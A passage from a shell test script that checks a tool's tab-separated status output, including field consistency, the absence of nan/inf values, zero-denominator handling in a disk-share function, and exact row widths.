  if [ "$st" = unavailable ] && [ "$sv" != unknown ]; then bad "unavailable <=> unknown ($c)"; fi
  if [ "$sv" = unknown ] && [ "$st" != unavailable ]; then bad "unavailable <=> unknown ($c)"; fi
  if [ "$st" != complete ] && [ -z "$(S 7)" ]; then bad "remedy required when not complete ($c)"; fi
  if [ "$st" = unavailable ] && [ "$(nfind)" != 0 ]; then bad "unavailable emits no findings ($c)"; fi
done
ok "unavailable <=> unknown, remedy present, no findings when unavailable"

hasnt "no nan anywhere"                "$all" nan
hasnt "no inf anywhere"                "$all" inf
eq "share guards a zero denominator"   "$(disk_share 100 0)" 0
eq "  and an empty one"                "$(disk_share 100 '')" 0

# Every row is exactly the §3b width, and no field carries a tab or a newline.
from_cache "$TMP/ok.tsv"
widths=$(printf '%s\n' "$OUT" | awk -F'\t' '{print $1 NF}' | sort -u | tr '\n' ' ')
eq "row widths are S=7 and F=14"       "$widths" "F14 S7 "
printf '%s\n' "$OUT" | awk -F'\t' 'NF!=7 && NF!=14 {exit 1}' && ok "no field split a row" || bad "no field split a row"

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
